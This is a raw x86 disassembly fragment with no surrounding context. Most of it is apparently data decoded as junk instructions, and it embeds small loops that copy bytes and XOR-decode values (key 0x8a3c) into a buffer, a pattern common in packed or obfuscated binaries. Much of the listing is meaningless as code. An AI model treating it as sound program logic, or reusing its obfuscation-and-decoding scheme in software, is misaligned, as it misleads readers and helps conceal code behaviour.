  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jmp    0x7e16:0xd242c746
  403263:	jle    0x403213
  403265:	jg     0x4032e5
  403267:	jle    0x403264
  403269:	fidiv  WORD PTR [ebp+0x13]
  40326c:	pop    ecx
  40326d:	jmp    0x720ff7eb
  403272:	aam    0xcd
  403274:	hlt    
  403275:	js     0x40328d
  403277:	sti    
  403278:	mov    bl,0x46
  40327a:	jp     0x40324d
  40327c:	das    
  40327d:	push   ebx
  40327e:	add    edx,ebp
  403280:	cmp    eax,0x1e6a1918
  403285:	sub    cl,BYTE PTR [ebx]
  403287:	push   esp
  403288:	mov    eax,0x6035fd53
  40328d:	xlat   BYTE PTR ds:[ebx]
  40328e:	and    eax,0x10df91ae
  403293:	adc    al,0xe5
  403295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403296:	stos   DWORD PTR es:[edi],eax
  403297:	pop    ds
  403298:	lods   al,BYTE PTR ds:[esi]
  403299:	popa   
  40329a:	jg     0x4032f9
  40329c:	arpl   bx,si
  40329e:	jp     0x40325f
  4032a0:	push   edx
  4032a1:	inc    ecx
  4032a2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a4:	push   0xbc6e8cf9
  4032a9:	jns    0x403306
  4032ab:	inc    eax
  4032ac:	inc    esi
  4032ad:	lock sbb dh,BYTE PTR [ecx+0x1c76695e]
  4032b4:	repnz or eax,0x42c3ecb5
  4032ba:	mov    ebp,0x39bfcac5
  4032bf:	mov    dh,0xe7
  4032c1:	aam    0x54
  4032c3:	xor    ch,0x75
  4032c6:	adc    eax,0xfbdafcb3
  4032cb:	dec    esi
  4032cc:	pop    es
  4032cd:	cmp    eax,0xce364a04
  4032d2:	inc    eax
  4032d3:	fcmove st,st(2)
  4032d5:	nop
  4032d6:	jb     0x403286
  4032d8:	rcl    BYTE PTR [ebp+0x65],1
  4032db:	shl    BYTE PTR [ebp+0xe6c74bc],cl
  4032e1:	pusha  
  4032e2:	pushf  
  4032e3:	rcl    DWORD PTR [ecx],1
  4032e5:	(bad)  
  4032e6:	mov    bh,BYTE PTR [edi]
  4032e8:	ror    DWORD PTR [ebx+0x46f11b4b],0xd7
  4032ef:	push   ecx
  4032f0:	test   bl,0x8a
  4032f3:	adc    BYTE PTR [edx+ebx*1+0x4b],bl
  4032f7:	push   edx
  4032f8:	inc    ebx
  4032f9:	push   esp
  4032fa:	nop
  4032fb:	inc    ebx
  4032fc:	cmp    edi,DWORD PTR [esi-0x46]
  4032ff:	mov    bl,0xc3
  403301:	call   0x5f57:0xc51185d1
  403308:	pushw  ds
  40330a:	addr16 jmp 0x403352
  40330d:	ror    BYTE PTR [edx-0x7f],cl
  403310:	retf   0x85c4
  403313:	das    
  403314:	sub    al,0xba
  403316:	sbb    ah,ah
  403318:	mov    ah,0xcb
  40331a:	inc    esp
  40331b:	imul   eax,DWORD PTR [ebp-0x4],0xa54b53bd
  403322:	xchg   DWORD PTR [edx-0x5659cdb],ebp
  403328:	cmp    DWORD PTR [ecx-0x4210a770],esi
  40332e:	stos   BYTE PTR es:[edi],al
  40332f:	cmc    
  403330:	dec    BYTE PTR [edi]
  403332:	mov    ds,WORD PTR [edi+0x1e58370a]
  403338:	fidiv  WORD PTR [eax+0x44]
  40333b:	mov    BYTE PTR [edx],bl
  40333d:	loope  0x403348
  40333f:	mov    dh,0xcd
  403341:	nop
  403342:	and    DWORD PTR [ecx+0x4735ae84],0xffffff8c
  403349:	into   
  40334a:	mov    esp,0x2f730d1a
  40334f:	xor    bh,BYTE PTR [ecx]
  403351:	ror    BYTE PTR [esi+0x1c78f6f3],1
  403357:	lock enter 0xef8f,0x18
  40335c:	stc    
  40335d:	leave  
  40335e:	adc    DWORD PTR [ebp+0x11e36aef],0xffffff9c
  403365:	inc    edx
  403366:	xor    BYTE PTR [eax+0x2aba3aed],al
  40336c:	mov    dl,ah
  40336e:	mov    ah,0x2
  403370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403371:	lods   eax,DWORD PTR ds:[esi]
  403372:	add    al,bl
  403374:	sbb    esp,eax
  403376:	xchg   edx,eax
  403377:	sbb    ebx,DWORD PTR [ebx+0x29fa7c42]
  40337d:	jg     0x40336b
  40337f:	aaa    
  403380:	mov    edx,0x456dcfd4
  403385:	xor    ebp,DWORD PTR [eax+0x1bb20933]
  40338b:	sar    BYTE PTR [esi],1
  40338d:	and    al,0x6
  40338f:	and    DWORD PTR [edx+edi*1+0x680de0e1],esi
  403396:	loop   0x40337e
  403398:	jmp    0x154feb82
  40339d:	popf   
  40339e:	arpl   WORD PTR [ecx],bx
  4033a0:	add    DWORD PTR [eax+0x5e90ac52],edx
  4033a6:	mov    bh,0x40
  4033a8:	aas    
  4033a9:	lea    ebp,[edx]
  4033ab:	dec    eax
  4033ac:	test   al,0xfc
  4033ae:	inc    ebx
  4033af:	or     ebp,ebx
  4033b1:	out    0x29,al
  4033b3:	pop    esi
  4033b4:	lods   al,BYTE PTR ds:[esi]
  4033b5:	cmp    BYTE PTR [eax-0x57],al
  4033b8:	cmp    cl,BYTE PTR [esp+edx*8]
  4033bb:	lods   eax,DWORD PTR ds:[esi]
  4033bc:	icebp  
  4033bd:	jmp    0x4033f1
  4033bf:	fs sti 
  4033c1:	rcr    BYTE PTR [edi+0x35bc7a97],cl
  4033c7:	ficomp WORD PTR [edx+0x10]
  4033ca:	mov    dh,0x36
  4033cc:	ret    
  4033cd:	xchg   esp,eax
  4033ce:	(bad)  
  4033cf:	push   ds
  4033d0:	mov    dh,BYTE PTR [esi+0x6790deaf]
  4033d6:	(bad)  
  4033d7:	stc    
  4033d8:	sbb    cl,ch
  4033da:	inc    ecx
  4033db:	ja     0x4033c8
  4033dd:	ficomp DWORD PTR [edi+0x1ce6d2e4]
  4033e3:	fild   DWORD PTR [ebp-0x7807c16f]
  4033e9:	sbb    al,0xc
  4033eb:	sbb    al,0x35
  4033ed:	pop    es
  4033ee:	jns    0x403377
  4033f0:	repnz inc ebp
  4033f2:	cmp    edi,DWORD PTR [ebp+0x470f12e8]
  4033f8:	mov    ds:0x96ff4ade,eax
  4033fd:	or     cl,BYTE PTR [eax-0x78]
  403400:	aad    0x56
  403402:	mov    ah,0xab
  403404:	sub    ah,al
  403406:	jae    0x403450
  403408:	scas   eax,DWORD PTR es:[edi]
  403409:	pop    ebp
  40340a:	cmc    
  40340b:	sete   BYTE PTR ds:0x93c1a516
  403412:	adc    dh,BYTE PTR [edx-0x78]
  403415:	push   edi
  403416:	xchg   ebx,eax
  403417:	(bad)  
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	mov    dl,0xb9
  403454:	push   0xffffffff
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4034aa
  40345f:	inc    eax
  403460:	rol    DWORD PTR [edi+esi*8+0x1f0245ea],1
  403467:	mov    ds:0x2b45fcce,eax
  40346c:	push   ds
  40346d:	addr16 sub edi,edi
  403470:	jle    0x403489
  403472:	cdq    
  403473:	dec    eax
  403474:	and    al,0x61
  403476:	xchg   edx,eax
  403477:	add    dl,BYTE PTR [esi]
  403479:	xchg   esp,eax
  40347a:	jo     0x40341b
  40347c:	shr    BYTE PTR [edi+eiz*4],1
  40347f:	add    al,0x82
  403481:	aas    
  403482:	push   esi
  403483:	push   0xb3aa222f
  403488:	pop    edi
  403489:	sar    DWORD PTR [eax+0x34950a38],cl
  40348f:	jg     0x403472
  403491:	xchg   edx,eax
  403492:	push   ecx
  403493:	sub    edi,eax
  403495:	mov    esi,0x918bbfc4
  40349a:	test   eax,0x9534d100
  40349f:	xchg   edi,eax
  4034a0:	popa   
  4034a1:	cmc    
  4034a2:	stos   DWORD PTR es:[edi],eax
  4034a3:	into   
  4034a4:	pop    es
  4034a5:	and    dh,BYTE PTR [edi+0x72a60a9c]
  4034ab:	mov    eax,0x5159ed32
  4034b0:	retf   
  4034b1:	xor    eax,0x12c78691
  4034b6:	lds    edx,FWORD PTR [ecx]
  4034b8:	mov    ecx,DWORD PTR [ecx]
  4034ba:	and    ecx,DWORD PTR [edi+0x6]
  4034bd:	inc    DWORD PTR [ebx-0x86cb244]
  4034c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034c4:	push   edx
  4034c5:	push   0x3d
  4034c7:	mov    al,dl
  4034c9:	sar    DWORD PTR [ebp-0x5c],1
  4034cc:	push   eax
  4034cd:	nop
  4034ce:	bound  esi,QWORD PTR [esi+0x3adf79a2]
  4034d4:	jae    0x4034f5
  4034d6:	mov    cl,0x45
  4034d8:	and    ch,BYTE PTR [ecx+0x1d]
  4034db:	ss (bad) 
  4034dd:	pcmpeqd mm7,QWORD PTR [ebx+0x877db0]
  4034e4:	iret   
  4034e5:	push   0xd57ca203
  4034ea:	out    0xea,al
  4034ec:	retf   0x1d52
  4034ef:	popf   
  4034f0:	push   esp
  4034f1:	inc    ebx
  4034f2:	or     DWORD PTR [ebp*1-0x519cfa9],ecx
  4034f9:	xor    ecx,ecx
  4034fb:	(bad)
  4034fe:	jge    0x4034bb
  403500:	(bad)  
  403501:	sbb    bl,ah
  403503:	mov    ch,0x23
  403505:	jno    0x4034e4
  403507:	cli    
  403508:	addr16 in al,0x6a
  40350b:	data16 repnz loopne 0x4034eb
  40350f:	sbb    ch,BYTE PTR [edi+0x1546364d]
  403515:	lock fild QWORD PTR ds:0x17964870
  40351c:	call   0x1d0b769e
  403521:	ds repnz stos DWORD PTR es:[edi],eax
  403524:	push   edi
  403525:	inc    ebx
  403526:	dec    esi
  403527:	mov    esp,0x57798b41
  40352c:	(bad)  
  40352d:	sbb    ebp,DWORD PTR [ecx+ebp*8+0x65]
  403531:	xchg   DWORD PTR [edx+0x3ab15cfb],ebp
  403537:	mov    ch,0x4a
  403539:	sti    
  40353a:	mov    al,0xc7
  40353c:	dec    esp
  40353d:	fmulp  st(2),st
  40353f:	test   al,0x0
  403541:	rcr    DWORD PTR [edx],cl
  403543:	and    BYTE PTR [eax],bh
  403545:	inc    ebp
  403546:	shl    DWORD PTR [ebp+ebx*2-0x12fc890],0xc8
  40354e:	hlt    
  40354f:	stos   BYTE PTR es:[edi],al
  403550:	in     eax,dx
  403551:	pop    eax
  403552:	mov    eax,0xb03007a6
  403557:	test   BYTE PTR [ebp-0x92503ec],dl
  40355d:	stos   BYTE PTR es:[edi],al
  40355e:	(bad)  
  40355f:	adc    esp,DWORD PTR [ebp+0x15d61238]
  403565:	inc    ecx
  403566:	rol    DWORD PTR [ecx-0x50],1
  403569:	xor    esp,DWORD PTR [ecx]
  40356b:	ss pop ebp
  40356d:	mov    WORD PTR [esi+0x6e],fs
  403570:	pop    eax
  403571:	(bad)  
  403572:	loopne 0x4035f1
  403574:	mov    bl,0x7c
  403576:	mov    WORD PTR [eax-0x7d],fs
  403579:	cdq    
  40357a:	stc    
  40357b:	enter  0xd202,0x28
  40357f:	test   al,0xb2
  403581:	and    eax,0xbbd02202
  403586:	push   edi
  403587:	test   al,0x79
  403589:	cmp    BYTE PTR [edi-0x761a3b61],dh
  40358f:	jp     0x4035fc
  403591:	(bad)
  403594:	xchg   esp,eax
  403595:	inc    eax
  403596:	xchg   esi,eax
  403597:	pop    es
  403598:	cmp    ebp,ecx
  40359a:	xchg   ebp,eax
  40359b:	cmp    DWORD PTR [edi],esp
  40359d:	iret   
  40359e:	rcl    DWORD PTR [edi-0x30],0x4d
  4035a2:	clc    
  4035a3:	push   ebx
  4035a4:	cs mov al,0xab
  4035a7:	mov    cl,BYTE PTR [esi]
  4035a9:	jnp    0x4035c0
  4035ab:	xlat   BYTE PTR ds:[ebx]
  4035ac:	mov    DWORD PTR [ecx],ebp
  4035ae:	xlat   BYTE PTR ds:[ebx]
  4035af:	pop    ebp
  4035b0:	pop    ecx
  4035b1:	fsubrp st(7),st
  4035b3:	iret   
  4035b4:	jl     0x403619
  4035b6:	xor    edi,DWORD PTR [ebp*8+0x430dac6a]
  4035bd:	xchg   edi,eax
  4035be:	xchg   edx,eax
  4035bf:	loope  0x403574
  4035c1:	out    0xf8,al
  4035c3:	arpl   WORD PTR [edi-0x13],dx
  4035c6:	mov    dl,0x38
  4035c8:	push   eax
  4035c9:	sar    DWORD PTR [ebx-0xc],cl
  4035cc:	lea    esi,[eax+0x70aeeaef]
  4035d2:	jp     0x403644
  4035d4:	mov    esi,0xd550f664
  4035d9:	add    ecx,DWORD PTR [eax+0x71dbd08]
  4035df:	je     0x40364b
  4035e1:	adc    eax,0xd09650bb
  4035e6:	lds    esi,FWORD PTR [esi-0x51a46ae7]
  4035ec:	inc    ebx
  4035ed:	inc    BYTE PTR [eax]
  4035ef:	sbb    edx,edx
  4035f1:	jmp    ecx
  4035f3:	shl    DWORD PTR [ecx+0x2b7503ee],0x2
  4035fa:	xchg   edx,eax
  4035fb:	ins    BYTE PTR es:[edi],dx
  4035fc:	pop    edi
  4035fd:	mov    dl,0xb7
  4035ff:	aaa    
  403600:	or     al,0x45
  403602:	xor    edi,DWORD PTR [ebp-0x6dcb82ec]
  403608:	inc    ecx
  403609:	add    al,0xd
  40360b:	retf   
  40360c:	push   es
  40360d:	mov    ebx,0xd603d133
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x8d3dd7c8
  40366f:	mov    edi,es
  403671:	(bad)  
  403672:	mov    dl,0x15
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x4036ab
  40367b:	adc    eax,0x315558ab
  403680:	fist   DWORD PTR [edi+0x542646a9]
  403686:	loope  0x403656
  403688:	jge    0x40369a
  40368a:	in     eax,0x1e
  40368c:	ss fwait
  40368e:	sbb    edi,esi
  403690:	inc    ecx
  403691:	ficom  DWORD PTR [ebp+edi*8-0x1]
  403695:	xchg   ebp,eax
  403696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403697:	inc    esp
  403698:	in     eax,0xba
  40369a:	xchg   esp,eax
  40369b:	dec    ebx
  40369c:	hlt    
  40369d:	pop    es
  40369e:	add    BYTE PTR [ebx-0x79],ah
  4036a1:	mov    al,0xa9
  4036a3:	add    DWORD PTR [ebp+0x18],eax
  4036a6:	test   BYTE PTR [ecx-0x3b854b2c],dh
  4036ac:	es call 0x7d09:0xc9f7737d
  4036b4:	cmp    esi,DWORD PTR [edx+0x45]
  4036b7:	sbb    al,BYTE PTR [edx+0x37bf9f0a]
  4036bd:	mov    edi,0xc13e5c22
  4036c2:	(bad)  
  4036c3:	dec    esp
  4036c4:	retf   
  4036c5:	ret    0x7861
  4036c8:	ss dec edx
  4036ca:	rol    DWORD PTR [ebx-0x39bc89c8],cl
  4036d0:	ja     0x4036ab
  4036d2:	aas    
  4036d3:	scas   eax,DWORD PTR es:[edi]
  4036d4:	int3   
  4036d5:	jnp    0x40370d
  4036d7:	cli    
  4036d8:	mov    dl,BYTE PTR [ecx]
  4036da:	in     al,dx
  4036db:	data16 scas al,BYTE PTR es:[edi]
  4036dd:	xor    al,ch
  4036df:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4036e1:	xchg   ecx,eax
  4036e2:	js     0x40367d
  4036e4:	icebp  
  4036e5:	sti    
  4036e6:	popa   
  4036e7:	add    edx,DWORD PTR [esi+0x3d]
  4036ea:	pop    esp
  4036eb:	ja     0x40373a
  4036ed:	mov    dl,0x67
  4036ef:	jg     0x403684
  4036f1:	out    0xa8,eax
  4036f3:	and    DWORD PTR [edi-0x765742b8],eax
  4036f9:	ins    BYTE PTR es:[edi],dx
  4036fa:	(bad)  
  4036fb:	(bad)  
  4036fc:	int    0x95
  4036fe:	jae    0x403773
  403700:	jp     0x403690
  403702:	mov    edi,0x3de67e00
  403707:	in     eax,dx
  403708:	push   ss
  403709:	pop    esi
  40370a:	daa    
  40370b:	hlt    
  40370c:	sub    BYTE PTR [edi-0x4155ff7],al
  403712:	push   ss
  403713:	mov    al,0x29
  403715:	pop    ds
  403716:	dec    esi
  403717:	jne    0x403797
  403719:	rol    BYTE PTR [ebp+0x3d],cl
  40371c:	popf   
  40371d:	shl    BYTE PTR [edi],1
  40371f:	add    al,0x92
  403721:	test   al,0x1
  403723:	xchg   ecx,eax
  403724:	pop    eax
  403725:	sbb    ecx,edi
  403727:	adc    eax,0xdcca9ac5
  40372c:	inc    eax
  40372d:	jns    0x403791
  40372f:	inc    eax
  403730:	adc    eax,0xc51149f3
  403735:	add    BYTE PTR [ecx],0xd7
  403738:	popf   
  403739:	xor    bh,bl
  40373b:	mov    eax,ds:0x81e0a97e
  403740:	mov    ch,0xcd
  403742:	and    DWORD PTR [edx+edi*2-0x5873d129],0x5
  40374a:	fist   WORD PTR [edi]
  40374c:	sub    ebp,DWORD PTR [eax-0x67a7e03b]
  403752:	push   0xffffffbe
  403754:	out    dx,eax
  403755:	dec    ebp
  403756:	mov    ebx,0x1515c3c9
  40375b:	push   ecx
  40375c:	bnd ret 
  40375e:	int3   
  40375f:	imul   edx,DWORD PTR [ebx-0x5bf06fd1],0x6b
  403766:	(bad)  
  403767:	jge    0x40371c
  403769:	imul   edx,DWORD PTR [edx+0x479f958d],0x39
  403770:	fwait
  403771:	call   0xcb75:0xa825bb08
  403778:	push   ds
  403779:	test   al,0xc0
  40377b:	addr16 xchg esp,eax
  40377d:	mov    al,0x47
  40377f:	aas    
  403780:	in     eax,dx
  403781:	jns    0x403717
  403783:	call   0xdd18176e
  403788:	fs mov esi,0x35745af8
  40378e:	mov    ebx,0x6fe4a7eb
  403793:	(bad)  
  403794:	mov    cl,0x31
  403796:	fcom   DWORD PTR [edi-0x70]
  403799:	int    0xd0
  40379b:	xchg   ebp,eax
  40379c:	retf   0xf031
  40379f:	stos   BYTE PTR es:[edi],al
  4037a0:	stc    
  4037a1:	mov    eax,ds:0xfdfd1b4
  4037a6:	(bad)  
  4037a7:	and    DWORD PTR [ecx],ebp
  4037a9:	fisubr DWORD PTR [esi+0x12]
  4037ac:	or     BYTE PTR [ebp+0xf079bac],cl
  4037b2:	scas   eax,DWORD PTR es:[edi]
  4037b3:	jmp    0xadc4a21a
  4037b8:	mov    ecx,0x77a6cb8b
  4037bd:	stos   BYTE PTR es:[edi],al
  4037be:	cmp    eax,0x6836e056
  4037c3:	adc    DWORD PTR [esi+0x49],0xda738d32
  4037ca:	mov    ch,0xae
  4037cc:	push   edi
  4037cd:	sbb    ch,al
  4037cf:	popa   
  4037d0:	sbb    eax,0xa8ae94cf
  4037d5:	inc    ebp
  4037d6:	jge    0x40380e
  4037d8:	enter  0x75c9,0x83
  4037dc:	arpl   WORD PTR [edi],ax
  4037de:	lahf   
  4037df:	aaa    
  4037e0:	sbb    al,0xc6
  4037e2:	call   0xe0cae0a2
  4037e7:	lea    edx,[ecx]
  4037e9:	in     eax,dx
  4037ea:	jl     0x403861
  4037ec:	jnp    0x4037ec
  4037ee:	stos   BYTE PTR es:[edi],al
  4037ef:	pushf  
  4037f0:	and    eax,0x875577a9
  4037f5:	rol    cl,cl
  4037f7:	cmp    bh,dl
  4037f9:	jle    0x4037ad
  4037fb:	fidiv  WORD PTR [eax-0x2f]
  4037fe:	mov    edi,0xc4366a51
  403803:	daa    
  403804:	adc    al,0x54
  403806:	in     al,dx
  403807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403808:	sti    
  403809:	(bad)  
  40380a:	out    0xbe,eax
  40380c:	xchg   ecx,eax
  40380d:	out    0xfb,al
  40380f:	jmp    0x6ad49e08
  403814:	stos   BYTE PTR es:[edi],al
  403815:	daa    
  403816:	mov    WORD PTR [eax],ss
  403818:	loop   0x40379d
  40381a:	fsubr  DWORD PTR ds:[eax-0x522b5eb4]
  403821:	mov    esi,0xada25f20
  403826:	mov    al,0xce
  403828:	sub    BYTE PTR [eax-0x75],bh
  40382b:	push   ebp
  40382c:	adc    BYTE PTR [ebx],dh
  40382e:	rol    DWORD PTR [ebx],0xc6
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x902f1a23
  403845:	aas    
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4038c2
  40384f:	jecxz  0x4037e6
  403851:	inc    esi
  403852:	out    dx,al
  403853:	daa    
  403854:	and    DWORD PTR [edx-0x6e2b7530],edi
  40385a:	mov    dl,0x68
  40385c:	push   cs
  40385d:	mov    dh,0xe9
  40385f:	iret   
  403860:	pop    ebx
  403861:	sbb    DWORD PTR [eax+0x3a445d6e],esp
  403867:	cld    
  403868:	xchg   esp,eax
  403869:	sbb    eax,0x771d3924
  40386e:	je     0x4038c5
  403870:	retf   0x27bc
  403873:	loopne 0x4038c4
  403875:	rol    BYTE PTR [ebx-0x6b7c9eb5],0x45
  40387c:	lods   eax,DWORD PTR ds:[esi]
  40387d:	rcr    BYTE PTR [eax],cl
  40387f:	outs   dx,BYTE PTR ds:[esi]
  403880:	mov    ecx,0xbbbb4ed1
  403885:	frstor [edi+0xd]
  403888:	xor    eax,0x1f5967c9
  40388d:	pop    ds
  40388e:	addr16 rol edi,0x5c
  403892:	dec    esp
  403893:	mov    ebp,0xe52b1579
  403898:	lock call 0x4d3b8b06
  40389e:	ficomp DWORD PTR [edi-0x77]
  4038a1:	in     al,dx
  4038a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038a3:	pop    ebp
  4038a4:	shr    BYTE PTR [ebx],1
  4038a6:	mov    ecx,0xc15f189f
  4038ab:	into   
  4038ac:	jne    0x40386e
  4038ae:	hlt    
  4038af:	rcl    ah,cl
  4038b1:	cmp    BYTE PTR [eax-0x58],al
  4038b4:	jae    0x4038d5
  4038b6:	and    DWORD PTR [edx+0x9e0dfb5],ecx
  4038bc:	test   al,0x43
  4038be:	aaa    
  4038bf:	pop    esp
  4038c0:	add    DWORD PTR [edi],esp
  4038c2:	lods   eax,DWORD PTR ds:[esi]
  4038c3:	xchg   esp,eax
  4038c4:	repnz sti 
  4038c6:	lock add ebx,DWORD PTR [eax-0x20]
  4038ca:	jle    0x40388f
  4038cc:	xor    ah,cl
  4038ce:	inc    esp
  4038cf:	inc    ebx
  4038d0:	add    esp,DWORD PTR [edx-0xb6babf0]
  4038d6:	xor    DWORD PTR [ebp-0x8fdab24],edx
  4038dc:	pushf  
  4038dd:	(bad)  
  4038de:	jbe    0x403893
  4038e0:	jl     0x403923
  4038e2:	pop    edx
  4038e3:	or     BYTE PTR [edx],ah
  4038e5:	or     DWORD PTR [eax+0x1c362e4a],eax
  4038eb:	cmp    DWORD PTR [eax],ebp
  4038ed:	daa    
  4038ee:	cwde   
  4038ef:	mov    edi,0x5b0c6bb9
  4038f4:	cmc    
  4038f5:	and    al,0x80
  4038f7:	xor    edx,esi
  4038f9:	xchg   esp,eax
  4038fa:	push   ebp
  4038fb:	mov    ebp,0xceea1071
  403900:	dec    ebx
  403901:	into   
  403902:	and    ah,bh
  403904:	push   es
  403905:	(bad)  
  403906:	je     0x403977
  403908:	xor    esi,edi
  40390a:	sar    DWORD PTR [ebp-0x48],0xd0
  40390e:	and    al,0xc6
  403910:	test   BYTE PTR [esi-0x41],0xa0
  403914:	sbb    BYTE PTR [eax+0x59],bl
  403917:	cs pop ds
  403919:	pop    eax
  40391a:	out    0x3a,al
  40391c:	lahf   
  40391d:	not    BYTE PTR [eax]
  40391f:	int3   
  403920:	sbb    edi,DWORD PTR [ecx]
  403922:	into   
  403923:	enter  0x806,0x8c
  403927:	ror    BYTE PTR [eax+0x6d],0x59
  40392b:	mov    bl,0xd9
  40392d:	or     al,0x7c
  40392f:	pop    ebp
  403930:	in     al,0x8a
  403932:	in     eax,0x9d
  403934:	in     al,0xdb
  403936:	mov    dh,0xf9
  403938:	push   ecx
  403939:	lahf   
  40393a:	add    eax,DWORD PTR [edx+0x5824ae55]
  403940:	data16 or BYTE PTR [ebx+0x353bd1f],dh
  403947:	push   esp
  403948:	fild   DWORD PTR [edx]
  40394a:	xchg   edx,eax
  40394b:	sub    eax,0x409f794c
  403950:	rcl    DWORD PTR ds:0x2bf62ae3,cl
  403956:	mov    edx,0x1fcf0703
  40395b:	inc    esp
  40395c:	in     eax,dx
  40395d:	pop    edi
  40395e:	inc    edi
  40395f:	lea    edi,[bx+di]
  403962:	(bad)  
  403963:	mov    DWORD PTR [edx],0xb80d79a1
  403969:	mov    dh,0x2b
  40396b:	push   esp
  40396c:	imul   di,bp,0xffd5
  403970:	inc    edx
  403971:	pop    esi
  403972:	rcl    DWORD PTR [edi],0x76
  403975:	inc    eax
  403976:	imul   eax,DWORD PTR [eax+0x546f3316],0x4f0bdbdc
  403980:	push   ecx
  403981:	add    BYTE PTR [eax+0x3d],ch
  403984:	arpl   dx,cx
  403986:	cmp    dl,bh
  403988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403989:	push   es
  40398a:	or     esp,DWORD PTR [esi+0x824b2fc]
  403990:	inc    edx
  403991:	lods   eax,DWORD PTR ds:[esi]
  403992:	inc    ecx
  403993:	dec    esi
  403994:	lods   eax,DWORD PTR ds:[esi]
  403995:	jg     0x40395b
  403997:	inc    ebp
  403998:	push   esp
  403999:	xchg   ebx,ebp
  40399b:	lods   al,BYTE PTR ds:[esi]
  40399c:	ins    BYTE PTR es:[edi],dx
  40399d:	sub    dl,dl
  40399f:	fsub   DWORD PTR ds:0xed80a95b
  4039a5:	inc    edx
  4039a6:	add    bh,bl
  4039a8:	sub    eax,DWORD PTR [ebx-0x60]
  4039ab:	nop
  4039ac:	aaa    
  4039ad:	pusha  
  4039ae:	dec    esi
  4039af:	jl     0x403a26
  4039b1:	mov    bh,0xdc
  4039b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039b4:	cli    
  4039b5:	push   esi
  4039b6:	cmp    DWORD PTR [esi],edx
  4039b8:	dec    edx
  4039b9:	scas   al,BYTE PTR es:[edi]
  4039ba:	clc    
  4039bb:	inc    ebx
  4039bc:	(bad)  
  4039bd:	ret    
  4039be:	xor    DWORD PTR [edi],0xffffffc1
  4039c1:	mov    edi,0x1b3ce25d
  4039c6:	mov    ecx,0x611b83fa
  4039cb:	fs cmp eax,0x3429f009
  4039d1:	dec    esp
  4039d2:	sahf   
  4039d3:	pop    ebp
  4039d4:	(bad)  
  4039d5:	lock pop ds
  4039d7:	in     eax,0xe2
  4039d9:	loopne 0x403a00
  4039db:	and    eax,0xc3e7dbcc
  4039e0:	or     BYTE PTR [edx+ebp*1+0x5435d121],0x6a
  4039e8:	cmc    
  4039e9:	fild   QWORD PTR [eax]
  4039eb:	add    dh,BYTE PTR [edi-0x584b97d7]
  4039f1:	add    bl,BYTE PTR [edi-0x517f14dc]
  4039f7:	push   ebp
  4039f8:	push   ecx
  4039f9:	pop    esp
  4039fa:	inc    esp
  4039fb:	mov    ds:0x289c8ae,eax
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
